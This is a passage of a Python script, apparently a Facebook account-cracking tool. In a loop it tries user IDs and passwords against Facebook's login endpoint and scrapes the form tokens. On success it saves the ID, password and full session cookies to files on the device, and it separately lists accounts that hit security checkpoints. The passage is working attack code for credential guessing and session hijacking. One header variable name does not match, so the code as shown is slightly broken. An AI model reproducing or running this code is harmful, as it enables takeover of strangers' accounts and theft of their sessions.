            sys.stdout.write(f'\r\33[38;5;46m[\033[38;5;46mMR-XD\33[38;5;46m] \033[38;5;46m- \33[38;5;46m[\033[38;5;46m{loop}\033[38;5;46m] \033[38;5;46m- \033[38;5;46m[\033[38;5;46mOK-{len(ok)}\033[38;5;46m]\r')
            sys.stdout.flush()
            ua=random.choice(ugen)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            ___SALMAN___={"authority": 'm.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://p.facebook.com/',
            'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?1',
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'none',
            "sec-fetch-user": '?1',
            "upgrade-insecure-requests": '1',
            'user-agent': ua}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=___MRX___).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                idf = re.findall('c_user=(.*);xs', coki)[0]
                print(f'\r\33[38;5;46m[RAJPUT.OK] '+idf+' | '+ps+'\33[38;5;46m')
                open('/sdcard/RAJPUT.COOKIE.txt','a').write(idf+'|'+ps+ ' | ' +coki+'\n')
                print(f'\r\033[1;97mCOOKIE : \033[1;97m'+coki)
                open('/sdcard/RAJPUT.OK.txt','a').write(idf+'|'+ps+'\n')
                ok.append(idf)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                idf = "1000"+coki1[0:11]
         #       print(f'\033[1;30m[RAJPUT..CP] {idf} | {ps}')
     #           open('/sdcard/RAJPUT..CP.txt','a').write(idf+'|'+ps+'\n')
                cp.append(idf)
                break
            else:
                continue
        loop+=1
    except:
        pass




_SALMAN_()
